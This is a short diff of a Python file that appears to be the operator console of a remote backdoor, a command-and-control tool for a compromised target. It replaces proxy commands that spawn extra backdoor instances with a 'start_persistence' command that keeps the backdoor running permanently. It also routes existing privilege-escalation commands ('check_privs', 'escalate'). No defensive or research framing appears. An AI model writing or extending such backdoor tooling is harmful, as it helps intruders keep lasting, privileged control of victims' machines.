@@ -99,10 +99,8 @@ def target_communication():
     print("   This is the main session. Proxy users connect independently.")
     print("   Each proxy connection creates a separate backdoor instance.")
     print("")
-    print("PROXY COMMANDS:")
-    print("   start_proxy            - Start proxy channel (creates new backdoor instances)")
-    print("   stop_proxy             - Stop proxy channel")
-    print("   proxy_status           - Get proxy status")
+    print("PERSISTENCE COMMANDS:")
+    print("   start_persistence      - Start persistent backdoor (stays running permanently)")
     print("")
     print(f"Connected to target: {ip[0]}:{ip[1]}")
     
@@ -269,17 +267,11 @@ def target_communication():
                 
                 # Also show target response
                 print(f"\nTarget response: {result}")
-        elif command in ['start_proxy', 'stop_proxy', 'proxy_status']:
-            # Handle proxy commands
+        elif command in ['start_persistence']:
+            # Handle persistence commands
             result = reliable_recv()
-            if command == 'start_proxy':
-                print(f"Proxy: {result}")
-            elif command == 'stop_proxy':
-                print(f"Proxy: {result}")
-            elif command == 'proxy_status':
-                print(f"Proxy Status:\n{'-'*40}")
-                print(result)
-                print("-"*40)
+            if command == 'start_persistence':
+                print(f"Persistence: {result}")
         elif command in ['check_privs', 'escalate', 'privesc_report']:
             # Handle privilege escalation commands
             result = reliable_recv()
